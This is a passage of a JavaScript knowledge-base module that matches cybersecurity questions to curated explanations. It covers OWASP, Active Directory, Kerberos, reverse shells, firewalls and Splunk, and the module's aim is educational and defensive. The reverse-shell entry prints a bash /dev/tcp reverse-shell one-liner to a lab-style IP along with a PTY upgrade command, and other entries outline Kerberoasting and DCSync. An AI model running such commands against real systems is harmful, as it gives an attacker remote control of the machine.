/**
 * Universal Cyber Knowledge Engine & Adaptive Concept Synthesizer
 * Provides expert-grade technical breakdowns across 25+ primary cybersecurity
 * domains, tools, protocols, and adversary techniques.
 * 
 * Features:
 * 1. Fast deterministic lookup for major industry topics.
 * 2. Adaptive Semantic Concept Synthesizer for arbitrary/emergent cybersecurity queries.
 * 3. Strict domain boundary isolation (zero off-topic cross-contamination).
 */

const CYBER_SECURITY_INDICATORS = [
  // Core security & defense terms
  /\b(security|cyber|cybersecurity|infosec|appsec|netsec|devsecops|soc|siem|soar|edr|xdr|ids|ips|iam|pam|dlp|casb|waf|firewall|zero\s*trust|mitre|owasp|cve|cvss|nist|cis|iso\s*27001|hipaa|pci-dss|gdpr|sentinel|splunk|defender)\b/i,
  // Threats, attacks, malware & exploits
  /\b(attack|threat|adversary|exploit|vulnerability|payload|malware|ransomware|trojan|worm|virus|rootkit|botnet|phishing|spear\s*phishing|social\s*engineering|spoofing|sniffing|mitm|man\s*in\s*the\s*middle|dos|ddos|brute\s*force|credential\s*stuffing|injection|sqli|xss|csrf|ssrf|idor|buffer\s*overflow|privesc|privilege\s*escalation|lateral\s*movement|persistence|exfiltration|c2|command\s*and\s*control|backdoor|shell|reverse\s*shell|bind\s*shell|zero\s*day|0-day)\b/i,
  // Operations, forensics, detection
  /\b(defense|defensive|blue\s*team|red\s*team|purple\s*team|threat\s*hunting|incident\s*response|dfir|forensics|triage|telemetry|honeypot|honeytoken|canary|patch|hardening|sanitization|encryption|decryption|cryptography|pki|certificate|signature|yara|sigma|kql|spl|suricata|snort|zeek)\b/i,
  // Systems, networking & protocols
  /\b(linux|unix|windows|active\s*directory|domain\s*controller|kerberos|ldap|dns|dhcp|tcp|udp|ip|icmp|bgp|routing|switch|vlan|subnet|nat|vpn|ipsec|wireguard|proxy|tls|ssl|ssh|http|https|api|rest|graphql|oauth|saml|jwt|mfa|2fa|sso|cloud|aws|azure|gcp|kubernetes|k8s|docker|container|ebpf|kernel|firmware|bios|uefi|scada|ics|plc|can\s*bus|automotive\s*security|osi|osi\s*model)\b/i,
  // Learning, tools & certifications
  /\b(certification|comptia|security\+|network\+|ceh|oscp|cissp|cism|tryhackme|hackthebox|portswigger|sans|pwn|reverse\s*engineering|disassembly|decompilation|wireshark|nmap|burp|metasploit|ghidra|kali|pcap|packet)\b/i
];

export class CyberKnowledgeEngine {
  /**
   * Evaluates whether a query or topic is genuinely related to cybersecurity, networking, systems, or IT.
   * @param {string} text
   * @returns {boolean}
   */
  static isCybersecurityRelated(text) {
    if (!text || typeof text !== 'string') return false;
    for (const pattern of CYBER_SECURITY_INDICATORS) {
      if (pattern.test(text)) return true;
    }
    return false;
  }

  /**
   * Evaluates query against the comprehensive cybersecurity knowledge taxonomy.
   * @param {string} coreTopic
   * @param {string} rawQuery
   * @returns {Object|null}
   */
  static lookup(coreTopic = '', rawQuery = '') {
    const qLower = (rawQuery || '').toLowerCase();
    const cLower = (coreTopic || '').toLowerCase();
    const combined = `${cLower} ${qLower}`;

    const matchKeyword = (text, kw) => {
      const escaped = kw.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      return new RegExp('(^|[^a-z0-9])' + escaped + '([^a-z0-9]|$)', 'i').test(text);
    };

    // Pass 1: exact regex match on coreTopic (most specific)
    if (cLower && cLower.length > 2) {
      for (const topic of CYBER_KNOWLEDGE_TOPICS) {
        if (topic.regex && topic.regex.test(cLower)) {
          return topic;
        }
      }
      for (const topic of CYBER_KNOWLEDGE_TOPICS) {
        if (topic.keywords && topic.keywords.some(k => matchKeyword(cLower, k))) {
          return topic;
        }
      }
    }

    // Pass 2: exact regex match on full query
    for (const topic of CYBER_KNOWLEDGE_TOPICS) {
      if (topic.regex && topic.regex.test(combined)) {
        return topic;
      }
    }

    // Pass 3: match against full query with strict word boundary
    for (const topic of CYBER_KNOWLEDGE_TOPICS) {
      if (topic.keywords && topic.keywords.some(k => matchKeyword(combined, k))) {
        return topic;
      }
    }
    return null;
  }

  /**
   * Formats a curated knowledge topic into structured, authoritative markdown.
   * @param {Object} topic
   * @returns {string}
   */
  static formatKnowledgeEntry(topic) {
    const sections = [];
    sections.push(`### ${topic.title} in Cybersecurity: Architecture & Operational Use\n\n${topic.overview}`);

    if (topic.pillars && topic.pillars.length > 0) {
      sections.push(`#### 1. Core Architectural Pillars\n• ${topic.pillars.join('\n• ')}`);
    }

    if (topic.operationalUse && topic.operationalUse.length > 0) {
      sections.push(`#### 2. How Security Teams Use It in Cybersecurity\n• ${topic.operationalUse.join('\n• ')}`);
    }

    if (topic.defenseAndHardening && topic.defenseAndHardening.length > 0) {
      sections.push(`#### 3. Core Security Controls, Hardening & Detection Rules\n• ${topic.defenseAndHardening.join('\n• ')}`);
    }

    return sections.join('\n\n');
  }

  /**
   * Adaptive Semantic Concept Synthesizer
   * Dynamically breaks down ANY arbitrary or specialized cybersecurity inquiry into:
   * 1. Architecture & Enterprise Context
   * 2. Core Technical Mechanics & Protocols
   * 3. Practical Operations (Blue Team & Red Team)
   * 4. Essential Security Controls & Detection Engineering
   * 
   * @param {string} coreTopic
   * @param {string} rawQuery
   * @param {string} [domainId]
   * @returns {string}
   */
  static adaptiveSynthesize(coreTopic = '', rawQuery = '', domainId = '') {
    const query = rawQuery || coreTopic || 'this security topic';
    let rawClean = (coreTopic && coreTopic.length > 2) ? coreTopic : query;
    rawClean = rawClean.replace(/^(can\s+one|how\s+can\s+one|how\s+to|how\s+does\s+one|what\s+is\s+the|how\s+do\s+we)\s+/i, '').trim();
    const topicTitle = rawClean.split(' ').slice(0, 4).map(w => w.charAt(0).toUpperCase() + w.slice(1)).join(' ');
    const qLower = query.toLowerCase();

    // Direct career/monetization/beginner safety guard inside adaptive engine
    if (/(newbie|noob|absolute\s+beginner|start\s+from\s+scratch|start\s+from\s+zero|where\s+(do|can|should|in)\s+.*start|where\s+to\s+start|how\s+(do|can|should|in)\s+.*start|how\s+to\s+start|how\s+to\s+begin|how\s+do\s+i\s+begin|what\s+should\s+i\s+do|don'?t\s+know\s+anything|know\s+nothing|zero\s+knowledge|just\s+getting\s+started|i\s+am\s+(a\s+)?(beginner|newbie|starting))/i.test(qLower) || /^(i\s+am|i'm|my|we|you)\b/i.test(rawClean)) {
      return `### Getting Started & Building Competence in Cybersecurity

Starting out in cybersecurity requires building hands-on competency step by step rather than memorizing abstract theory. 

Here is the practitioner-proven foundation:
• **Step 1: Computer Networking Fundamentals:** Learn how packets move across the internet (IP addressing, TCP/UDP, DNS, and the 7-Layer OSI model). Start with **[Professor Messer's CompTIA Network+ Training Course](https://www.professormesser.com/network-plus/n10-008/n10-008-training-course/)**.
• **Step 2: Linux Command Line:** Over 80% of security systems run on Linux. Practice terminal navigation, file permissions, and shell utilities on **[OverTheWire Wargames: Bandit](https://overthewire.org/wargames/bandit/)**.
• **Step 3: Foundational Security Principles:** Master the CompTIA Security+ syllabus (threat models, authentication, cryptography, defensive controls) with **[Professor Messer's CompTIA Security+ Training Course](https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/sy0-701-training-course/)**.
• **Step 4: Interactive Problem Solving:** Practice hands-on web application security on **[PortSwigger Web Security Academy](https://portswigger.net/web-security)**.`;
    }

    // Direct career/monetization safety guard inside adaptive engine
    if (/\b(earn|earning|earnings|income|salary|salaries|get\s*paid|freelanc\w*|bug\s*bount\w*|side\s*hustle|career|job|jobs|hiring)\b/i.test(qLower)) {
      return `### Career Progression & Practical Income Pathways in Cybersecurity

In professional cybersecurity, earning potential and career progression are driven by **demonstrable technical capability and verifiable risk reduction**. 

Organizations hire and compensate security talent across key operational specializations:
• **Security Operations (SOC Analyst & Incident Response):** Triaging alerts, analyzing security telemetry, and containing threats ($65k–$90k entry).
• **Offensive Security & Application Security (Pentesting & Bug Bounties):** Testing web applications, APIs, and networks for exploitable flaws ($75k–$115k).
• **Cloud & Infrastructure Security (DevSecOps):** Securing cloud environments (AWS/Azure/GCP) and CI/CD automation pipelines ($110k–$160k+).

The most reliable strategy to secure paid roles is building verifiable proof of work through free, hands-on lab platforms (like PortSwigger Academy and TryHackMe) and anchoring your foundation with the CompTIA Security+ certification.`;
    }

    // Determine technical specialization
    let role = 'Defensive Engineering & Threat Mitigation';
    let mechanics = 'evaluates data flows, system calls, network boundaries, and state transitions to uphold the CIA triad (Confidentiality, Integrity, and Availability).';
    let blueTeam = 'monitors enterprise telemetry, ingests logs into SIEM/EDR, establishes baseline behavior, and configures automated alerting for anomalous deviations.';
    let redTeam = 'identifies architectural misconfigurations, probes boundary defenses, maps attack surfaces, and validates resilience through authorized adversary emulation.';
    let defense = 'implementing least-privilege access controls, enabling continuous telemetry monitoring, enforcing secure baselines (CIS Benchmarks), and conducting periodic posture assessments.';

    if (/(exploit|attack|bypass|vulnerability|injection|payload|cve|overflow|hijack|crack|rootkit|backdoor|malware)/i.test(qLower)) {
      role = 'Vulnerability Analysis, Threat Modeling & Exploitation Vectors';
      mechanics = 'exploits software logic flaws, memory safety oversights, unvalidated input boundaries, or missing authorization controls to alter intended program execution.';
      blueTeam = 'analyzes process lineage, monitors memory protections, inspects ingress/egress network traffic, and authors YARA / Sigma detection signatures.';
      redTeam = 'researches proof-of-concept vectors, tests defense evasion boundaries, and demonstrates impact within authorized testing scopes.';
      defense = 'rigorous input parameterization/sanitization, deploying WAF/EDR inspection rules, timely CVE patch management, and automated vulnerability scanning.';
    } else if (/(detect|siem|soc|monitor|edr|xdr|telemetry|log|alert|hunt|triage|incident|forensic)/i.test(qLower)) {
      role = 'Security Operations Center (SOC), Threat Hunting & Incident Response';
      mechanics = 'aggregates structured and unstructured log events, normalizes field schemas, and correlates multi-source signals across time windows to detect threat actor TTPs.';
      blueTeam = 'triages high-fidelity alerts, constructs incident timelines, investigates compromised hosts, and executes containment runbooks.';
      redTeam = 'tests detection boundaries, identifies telemetry blind spots, and simulates stealthy living-off-the-land techniques (LOLBins).';
      defense = 'enforcing comprehensive audit logging (Sysmon, Windows Event Logs, DNS queries), tuning alert thresholds to minimize fatigue, and deploying automated SOAR playbooks.';
    } else if (/(firewall|network|packet|protocol|routing|switch|vlan|port|traffic|proxy|dns|ipsec|tcp|udp)/i.test(qLower)) {
      role = 'Network Security Architecture & Traffic Inspection';
      mechanics = 'operates across layers of the OSI stack, evaluating packet headers, connection state tables, application payloads, and routing encapsulation.';
      blueTeam = 'analyzes network flow logs (NetFlow/IPFIX), tunes IDS/IPS signatures, inspects anomalous outbound connections, and isolates compromised subnets.';
      redTeam = 'performs network mapping, scans exposed service ports, identifies pivoting pathways, and probes firewall egress restrictions.';
      defense = 'enforcing default-deny egress/ingress policies, microsegmenting sensitive network tiers, inspecting encrypted traffic, and implementing 802.1X port security.';
    } else if (/(identity|iam|auth|credential|token|password|active directory|oauth|saml|sso|mfa|kerberos|access control)/i.test(qLower)) {
      role = 'Identity & Access Management (IAM) & Authentication Security';
      mechanics = 'authenticates entities via cryptographic tokens, verifies permission grants against access control lists (ACLs/RBAC), and manages identity lifecycle state.';
      blueTeam = 'monitors authentication telemetry for password spraying, brute force, impossible travel, and unauthorized privilege delegation.';
      redTeam = 'audits identity trust relationships, checks for overprivileged service accounts, and evaluates token replay or credential harvesting vectors.';
      defense = 'mandating phishing-resistant MFA (FIDO2/WebAuthn), enforcing Least Privilege (JIT/JEA), disabling legacy protocols, and auditing directory permissions.';
    } else if (/(cloud|aws|azure|gcp|kubernetes|k8s|docker|container|serverless|s3|ebpf)/i.test(qLower)) {
      role = 'Cloud Infrastructure, Container & Workload Security';
      mechanics = 'manages virtualized control planes, cloud API gateways, container namespaces/cgroups, and declarative infrastructure configurations.';
      blueTeam = 'monitors cloud audit trails (CloudTrail, Activity Logs), enforces posture management (CSPM), and inspects container runtime anomalies.';
      redTeam = 'discovers exposed cloud storage buckets, probes metadata service endpoints (IMDS), and tests IAM role assumption boundaries.';
      defense = 'enforcing the Shared Responsibility Model, restricting IAM wildcard permissions, scanning Infrastructure as Code (IaC) in CI/CD, and requiring IMDSv2.';
    }

    return `### ${topicTitle} in Cybersecurity: Architecture & Operational Use

In enterprise cybersecurity, **${topicTitle}** plays a critical role in **${role}**. Organizations design, configure, and monitor this capability to safeguard digital assets, eliminate vulnerabilities, and maintain operational resilience.

#### 1. Core Technical Mechanics & Architecture
• **Underlying Function:** At a technical level, ${topicTitle} ${mechanics}
• **System & Protocol Integration:** Operates within modern operating systems and network infrastructure by interfacing with underlying kernel drivers, network protocol stacks, or application runtime layers.
• **Threat Surface Considerations:** If misconfigured, unmonitored, or left unpatched, weaknesses in this area can be leveraged for unauthorized access, data exposure, or lateral movement.

#### 2. Practical Security Operations (Blue & Red Team Use)
• **Blue Team & Defensive Operations (SOC, Detection, Incident Response):** Security teams ${blueTeam}
• **Red Team & Adversary Simulation:** During authorized security assessments, penetration testers ${redTeam}

#### 3. Recommended Security Controls & Detection Engineering
• **Configuration Hardening:** Harden system configurations according to industry baselines (such as CIS Benchmarks or NIST guidelines).
• **Telemetry & Visibility:** Ensure all relevant operational logs and audit events are centralized and retained for threat hunting and incident correlation.
• **Defensive Countermeasures:** Focus on ${defense}`;
  }
}

export const CYBER_KNOWLEDGE_TOPICS = [
  // 0. OWASP Top 10
  {
    id: 'owasp_top_10',
    title: 'OWASP Top 10 Web Application Security Risks',
    keywords: ['owasp', 'owasp top 10', 'owasp top ten', 'broken access control', 'cryptographic failures', 'owasp injection', 'insecure design', 'security misconfiguration'],
    regex: /\b(owasp|owasp top 10)\b/i,
    role: 'Web Application Security Standard & Threat Categorization',
    overview: 'The OWASP (Open Worldwide Application Security Project) Top 10 is the universally recognized awareness document and foundational security standard for web application developers and security practitioners. It classifies and ranks the ten most critical security risks facing web applications today, offering practical guidance on root causes, exploit vectors, and defensive controls.',
    pillars: [
      '**A01:2021 — Broken Access Control (Rank #1):** Failures in enforcing policy such that users cannot act outside their intended permissions. Encompasses Insecure Direct Object References (IDOR), unauthorized privilege escalation (user to admin), and bypassing access checks by modifying URLs or parameters.',
      '**A02:2021 — Cryptographic Failures (Rank #2):** Formerly known as Sensitive Data Exposure. Focuses on failures related to cryptography (such as transmission of sensitive data in cleartext HTTP/FTP, usage of outdated ciphers like DES/RC4/MD5, and weak cryptographic key generation).',
      '**A03:2021 — Injection (Rank #3):** Flaws where untrusted user data is sent to an interpreter as part of a command or query without proper validation or parameterization (SQL Injection, OS Command Injection, LDAP Injection, ORM Injection).',
      '**A04:2021 — Insecure Design (Rank #4):** Broad category representing architectural design flaws, missing threat modeling, and lack of defense-in-depth before software code is written.',
      '**A05:2021 — Security Misconfiguration (Rank #5):** Overly permissive default configurations, unpatched software, verbose error stack traces revealing system internals, open cloud storage buckets, and unnecessary services or ports enabled.'
    ],
    operationalUse: [
      '**AppSec Engineers & Developers:** Integrating OWASP Top 10 automated test suites into CI/CD pipelines via SAST (Static Analysis), DAST (Dynamic Analysis), and SCA (Software Composition Analysis) to catch security flaws before production deployment.',
      '**Penetration Testers:** Systematically auditing web targets against the Top 10 categories using web application proxies (Burp Suite, OWASP ZAP) to identify exploitable attack surfaces.'
    ],
    defenseAndHardening: [
      '**Shift-Left Security:** Perform threat modeling and secure architecture reviews during early design stages.',
      '**Defense-in-Depth:** Enforce strict server-side input validation and parameterized queries, deploy Web Application Firewalls (WAF) with OWASP Core Rule Sets, and configure robust Content Security Policies (CSP).'
    ],
    followUpQuestion: 'Would you like to explore how to practice testing the OWASP Top 10 in a legal sandbox like OWASP Juice Shop or PortSwigger Web Security Academy?',
    authorityResource: {
      id: 'auth-owasp-top-10',
      title: 'OWASP Top 10 Web Application Security Risks',
      canonicalUrl: 'https://owasp.org/www-project-top-ten/',
      provider: { name: 'OWASP' },
      resourceType: 'official_doc',
      difficultyLevel: 'beginner',
      provenance: { origin: 'internal_index' },
      whyRecommended: 'The globally accepted industry standard awareness document for web application security.'
    }
  },

  // 1. Active Directory
  {
    id: 'active_directory',
    title: 'Active Directory Domain Services (AD DS)',
    keywords: ['active directory', 'ad ds', 'domain controller', 'group policy', 'gpo', 'ntds.dit', 'sysvol', 'active directory and how'],
    regex: /\b(active directory|ad ds|domain controller|group policy|gpo|ntds\.dit|sysvol)\b/i,
    role: 'Enterprise Identity, Access Management & Network Domain Control',
    overview: 'Active Directory Domain Services (AD DS) is Microsoft\'s centralized directory service used by over 90% of Fortune 500 enterprises to manage user accounts, computer assets, access permissions, and security configurations across corporate networks. It serves as the primary authentication and authorization backbone for corporate enterprise environments.',
    pillars: [
      '**Hierarchical Structure:** Organized into Forests, Trees, Domains, and Organizational Units (OUs). All objects (users, computers, groups) are stored in the `NTDS.dit` database file on Domain Controllers (DCs) and synchronized via DRSUAPI directory replication.',
      '**Integrated Protocol Stack:** Coordinates Kerberos v5 (port 88) for primary authentication, LDAP/LDAPS (ports 389/636) for directory querying and attribute modification, DNS (port 53) for service location via SRV records, and SMB (port 445) for SYSVOL policy replication.',
      '**Group Policy Objects (GPOs):** Provides centralized configuration and security baselines, automatically pushing firewall rules, password complexity policies, script execution, and user rights assignments across thousands of endpoints.',
      '**Trust Architecture:** Establishes secure cross-domain and cross-forest authentication boundaries using transitive or non-transitive Kerberos trust links.'
    ],
    operationalUse: [
      '**SOC & Blue Team Operations:** Analysts monitor DC event logs for adversary tradecraft: Event ID 4624 (Logon), Event ID 4625 (Failed Logon - brute force / password spraying), Event ID 4720 (User Created), Event ID 4728/4732 (User added to privileged groups like Domain Admins), and Event ID 4662 (Access to directory objects). Teams enforce Tiered Administration (Tier 0 for DCs, Tier 1 for Servers, Tier 2 for Endpoints).',
      '**Red Team & Penetration Testing:** Operators map attack pathways using BloodHound, harvest credentials via AS-REP Roasting or Kerberoasting, exploit unconstrained delegation, execute DCSync to extract password hashes directly from the DC, and forge Golden/Silver tickets upon domain compromise.'
    ],
    defenseAndHardening: [
      '**Deploy LAPS (Local Administrator Password Solution):** Automatically randomizes and rotates local administrator passwords on all workstations, eliminating lateral movement.',
      '**Harden Domain Controllers:** Restrict Tier 0 access to dedicated Privileged Access Workstations (PAWs), enable the Protected Users security group for all administrative accounts, and enforce LDAP signing and channel binding.',
      '**Deprecate Legacy Protocols:** Completely disable NTLMv1 and LM protocols, enforce SMB signing, and audit Active Directory misconfigurations regularly using PingCastle or BloodHound.'
    ],
    followUpQuestion: 'Would you like to explore how Kerberos authentication interacts with Active Directory, or see how security analysts monitor Event ID 4624/4625 for password spraying?',
    authorityResource: {
      id: 'auth-active-directory',
      title: 'Microsoft Learn: Active Directory Domain Services Overview & Security Architecture',
      canonicalUrl: 'https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-domain-services',
      provider: { name: 'Microsoft' },
      resourceType: 'official_doc',
      difficultyLevel: 'intermediate',
      provenance: { origin: 'internal_index' },
      whyRecommended: 'Official architectural documentation from Microsoft on domain controller configuration, trust models, and enterprise directory security.'
    }
  },

  // 2. Kerberos Protocol
  {
    id: 'kerberos',
    title: 'Kerberos v5 Authentication Protocol',
    keywords: ['kerberos', 'tgt', 'ticket granting ticket', 'tgs', 'kdc', 'as-req', 'as-rep', 'tgs-req', 'kerberoasting', 'golden ticket', 'silver ticket'],
    regex: /\b(kerberos|ticket granting ticket|tgt|tgs|kdc|as-req|as-rep|kerberoast|golden ticket|silver ticket)\b/i,
    role: 'Enterprise Mutual Authentication & Cryptographic Single Sign-On',
    overview: 'Kerberos v5 is a stateless, ticket-based cryptographic authentication protocol designed to verify the identities of users and network services across an untrusted network without sending cleartext credentials over the wire. It is the default authentication mechanism in Microsoft Active Directory and Unix enterprise realms.',
    pillars: [
      '**Key Distribution Center (KDC):** Hosted on port 88 of every Domain Controller, comprising the Authentication Service (AS) and Ticket Granting Service (TGS).',
      '**Step 1 - Authentication Service Exchange (AS-REQ / AS-REP):** The client encrypts a timestamp with their password hash and submits an AS-REQ. The KDC verifies it against the user\'s secret key and replies with an AS-REP containing a Ticket Granting Ticket (TGT, encrypted with the `krbtgt` key) and a temporary Client/TGS session key.',
      '**Step 2 - Ticket Granting Service Exchange (TGS-REQ / TGS-REP):** When accessing a network service (e.g. MSSQL or SMB), the client sends the TGT and an Authenticator to request a service ticket. The KDC verifies the TGT and Privilege Attribute Certificate (PAC), returning a Service Ticket (ST) encrypted with the target service account\'s secret key.',
      '**Step 3 - Client/Server Exchange (AP-REQ / AP-REP):** The client presents the Service Ticket to the target service. The server decrypts it with its own key, validates user rights in the PAC, and establishes the authenticated session.'
    ],
    operationalUse: [
      '**SOC & Blue Team Monitoring:** Monitoring Event ID 4768 (TGT Requested - watching for encryption downgrade to RC4), Event ID 4769 (Service Ticket Requested - detecting Kerberoasting spikes where a single user requests dozens of RC4 tickets), and Event ID 4771 (Pre-authentication failed - tracking password spraying).',
      '**Red Team Simulation:** Kerberoasting (requesting service tickets for accounts with Service Principal Names / SPNs and cracking hashes offline with Hashcat), AS-REP Roasting (requesting TGTs for accounts with pre-auth disabled), and Golden Tickets (forging 10-year TGTs using the compromised `krbtgt` hash).'
    ],
    defenseAndHardening: [
      '**Enforce AES Kerberos Encryption:** Deprecate weak DES and RC4-HMAC ciphers; require AES-128 and AES-256 for all Kerberos exchanges.',
      '**Deploy Group Managed Service Accounts (gMSA):** Replaces static service account passwords with automatic 128-character password rotation handled by the DC, neutralizing Kerberoasting.',
      '**Rotate the krbtgt Account Password:** Execute a scripted double-rotation of the `krbtgt` account password periodically to invalidate any forged Golden Tickets.'
    ],
    followUpQuestion: 'Would you like to explore how Kerberoasting extracts service ticket hashes, or see how to detect abnormal TGS requests in your SIEM?',
    authorityResource: {
      id: 'auth-kerberos',
      title: 'Microsoft Learn: Kerberos Authentication Overview & Technical Specification',
      canonicalUrl: 'https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview',
      provider: { name: 'Microsoft' },
      resourceType: 'official_doc',
      difficultyLevel: 'intermediate',
      provenance: { origin: 'internal_index' },
      whyRecommended: 'Comprehensive official technical breakdown of the Kerberos ticketing exchange, ticket lifetimes, and encryption types.'
    }
  },

  // 3. Reverse Shell vs Bind Shell
  {
    id: 'reverse_shell',
    title: 'Reverse Shell vs Bind Shell & Egress Command-and-Control',
    keywords: ['reverse shell', 'bind shell', 'netcat listener', 'remote shell', 'socat shell', 'meterpreter shell', 'spawning a shell', 'nc -lvnp'],
    regex: /\b(reverse shell|bind shell|interactive shell|netcat listener|nc -lvnp|remote shell)\b/i,
    role: 'Interactive Remote Host Administration & Post-Exploitation Command Execution',
    overview: 'A shell connection bridges a terminal session between a remote target system and an operator\'s workstation. In cybersecurity, understanding the architectural difference between a Reverse Shell and a Bind Shell is fundamental to network defense, ingress/egress filtering, and incident investigation.',
    pillars: [
      '**Reverse Shell Architecture (Target -> Attacker):** The operator sets up a listener on their workstation (e.g. `nc -lvnp 4444`). The target host executes a payload that opens an **outbound** TCP or UDP connection back to the listener, redirecting standard input, output, and error (`stdin`, `stdout`, `stderr`) to the network socket. This bypasses stateful inbound firewall rules, NAT routers, and port forwarding constraints.',
      '**Bind Shell Architecture (Attacker -> Target):** The target machine opens a listening port on itself and binds a command interpreter (`/bin/bash` or `cmd.exe`) to that port. The operator connects **inbound** to the target\'s IP and port. In enterprise environments, bind shells are almost always blocked by perimeter firewalls and NAT.',
      '**Execution Mechanisms:** Executed via built-in system binaries (LOLBins), scripting interpreters (Bash, Python, Perl, PowerShell, PHP), or compiled binaries. Example Linux one-liner: `bash -i >& /dev/tcp/10.10.14.5/4444 0>&1`. Example Windows: PowerShell `System.Net.Sockets.TCPClient`.',
      '**PTY Spawning & Interactive Upgrades:** Raw reverse shells lack terminal job control, tab completion, and arrow keys. Operators upgrade them using Python (`python3 -c "import pty; pty.spawn(\"/bin/bash\")"`) and terminal raw mode (`stty raw -echo`) to run interactive programs like `sudo` and `top`.'
    ],
    operationalUse: [
      '**SOC & Blue Team Detection:** Endpoint Detection and Response (EDR) and Sysmon monitor for anomalous process creation trees: web servers (`www-data`, `apache2`, `nginx`, `w3wp.exe`) or database daemons spawning child command shells (`sh`, `bash`, `cmd.exe`, `powershell.exe`). Network monitors (Zeek, Suricata) detect persistent interactive outbound TCP connections with bidirectional terminal character flow.',
      '**Red Team & Penetration Testing:** Deployed during authorized assessments and CTFs after achieving Remote Code Execution (RCE) to obtain an interactive command line for post-exploitation auditing.'
    ],
    defenseAndHardening: [
      '**Strict Outbound Egress Filtering:** Block all outbound traffic from internal servers by default; force all web and API traffic through an inspecting forward proxy to prevent raw outbound TCP sockets on arbitrary ports.',
      '**Process Lineage Hardening:** Configure Windows Attack Surface Reduction (ASR) rules and Linux AppArmor/SELinux profiles to forbid web servers and database services from launching command interpreters.',
      '**Non-Interactive Service Accounts:** Set `/usr/sbin/nologin` or `/bin/false` as the login shell for all service accounts.'
    ],
    followUpQuestion: 'Would you like to see how to upgrade a basic reverse shell into a fully interactive PTY terminal, or explore how EDR sensors detect parent-child process anomalies?',
    authorityResource: {
      id: 'auth-reverse-shell',
      title: 'SANS Institute: Understanding Reverse Shells, Process Lineage, and Egress Detection',
      canonicalUrl: 'https://www.sans.org/blog/reverse-shells/',
      provider: { name: 'SANS Institute' },
      resourceType: 'cheatsheet',
      difficultyLevel: 'beginner',
      provenance: { origin: 'internal_index' },
      whyRecommended: 'Expert breakdown of shell mechanics, parent-child process anomalies, and effective enterprise egress firewalling.'
    }
  },

  // 4. Firewalls & WAF
  {
    id: 'firewall_waf',
    title: 'Firewalls & Web Application Firewalls (WAF)',
    keywords: ['firewall', 'firewalls', 'waf', 'web application firewall', 'ngfw', 'packet filter', 'stateful inspection', 'modsecurity', 'palo alto', 'fortinet'],
    regex: /\b(firewalls?|waf|web application firewall|ngfw|next-gen firewall|modsecurity|packet filter|stateful inspection)\b/i,
    role: 'Perimeter Defense, Network Segmentation & Layer 7 Application Traffic Filtering',
    overview: 'Firewalls are hardware devices or software systems that monitor, inspect, and filter incoming and outgoing network traffic based on defined security policies. Modern defense-in-depth incorporates a multi-tiered architecture combining Network Firewalls (L3/L4), Next-Generation Firewalls (NGFW L7), and Web Application Firewalls (WAF L7).',
    pillars: [
      '**Stateless Packet Filters (L3/L4):** Inspects individual packet headers (source IP, destination IP, port numbers, protocol) against static Access Control Lists (ACLs). Fast, but lacks session tracking or payload awareness.',
      '**Stateful Inspection Firewalls (L4):** Tracks active connection states (NEW, ESTABLISHED, RELATED) using dynamic state tables. Automatically allows return traffic for legitimate outbound requests without opening inbound ports.',
      '**Next-Generation Firewalls (NGFW, L7):** Provides deep packet inspection (DPI), application identification regardless of port used (e.g. detecting SSH over port 80), integrated Intrusion Prevention (IPS), user identity mapping, and TLS/SSL decryption.',
      '**Web Application Firewalls (WAF, L7 HTTP/HTTPS):** Specifically safeguards web applications and APIs by inspecting HTTP/HTTPS payloads against OWASP Top 10 attack signatures (SQLi, XSS, Path Traversal, SSRF) using Core Rule Sets (e.g. OWASP CRS on ModSecurity, Cloudflare, or AWS WAF).'
    ],
    operationalUse: [
      '**SOC & Network Operations:** Correlating firewall drop/deny logs with threat intelligence feeds to spot scanning sweeps, brute-force attacks, and C2 beacons. Tuning WAF rules in detection/monitoring mode before transitioning to blocking mode to avoid breaking legitimate transactions.',
      '**Network Segmentation:** Enforcing microsegmentation between Demilitarized Zones (DMZs), internal subnets, database tiers, and management planes.'
    ],
    defenseAndHardening: [
      '**Default-Deny Policy:** Enforce explicit default-deny on both inbound and outbound traffic; only permit specifically documented ports and destinations.',
      '**Inspect Outbound Egress:** Inspect and restrict outbound traffic to prevent malware data exfiltration and reverse shell connections.',
      '**Regular Rule Auditing:** Continuously audit firewall rule sets to eliminate obsolete rules, shadow rules, and overly permissive any-any entries.'
    ],
    followUpQuestion: 'Would you like to see how to configure stateful iptables rules, or explore how WAF inspection engines parse OWASP Core Rule Sets?',
    authorityResource: {
      id: 'auth-firewall',
      title: 'NIST SP 800-41 Rev. 1: Guidelines on Firewalls and Firewall Policy',
      canonicalUrl: 'https://csrc.nist.gov/publications/detail/sp/800-41/rev-1/final',
      provider: { name: 'NIST' },
      resourceType: 'official_doc',
      difficultyLevel: 'intermediate',
      provenance: { origin: 'internal_index' },
      whyRecommended: 'The definitive federal standard on firewall architectures, rule design, and network perimeter protection.'
    }
  },

  // 5. Splunk & SIEM
  {
    id: 'splunk_siem',
    title: 'Splunk & Enterprise SIEM Architecture',
    keywords: ['splunk', 'siem', 'splunk enterprise', 'search head', 'indexer', 'universal forwarder', 'spl', 'correlation search'],
    regex: /\b(splunk|siem|security information and event management|splunk enterprise|search head|indexer)\b/i,
    role: 'Centralized Telemetry Aggregation, Real-Time Correlation & Security Analytics',
    overview: 'Splunk is an enterprise data platform and Security Information and Event Management (SIEM) solution. It ingests machine data across servers, endpoints, network devices, cloud services, and security tools, indexing it in real time so security analysts can detect threats, investigate incidents, and maintain compliance.',
    pillars: [
      '**Distributed Ingestion Tier:** Universal Forwarders (UF) are lightweight agents deployed on endpoints and servers to collect and stream raw logs. Heavy Forwarders (HF) perform parsing, filtering, and data masking (redacting sensitive PII).',
      '**Indexing Tier:** Indexers process incoming log streams, parse timestamps and sourcetypes, generate inverted indexes, and write immutable compressed data to disk buckets categorized by age (Hot, Warm, Cold, and Frozen).',
      '**Search Head & Search Processing Language (SPL):** Coordinates search queries across indexers using SPL. Analysts author searches combining pipelined commands (e.g. `index=wineventlog EventCode=4625 | stats count by user, src_ip | where count > 10`).',
      '**Enterprise Security (ES) & CIM:** Splunk Enterprise Security provides correlation searches mapped to MITRE ATT&CK. The Common Information Model (CIM) normalizes disparate vendor log schemas into unified data models.'
    ],
    operationalUse: [
      '**SOC Tier 1 & 2 Triage:** Analysts investigate notable event alerts, pivot between sourcetypes, reconstruct attack timelines, and correlate endpoint actions with network telemetry.',
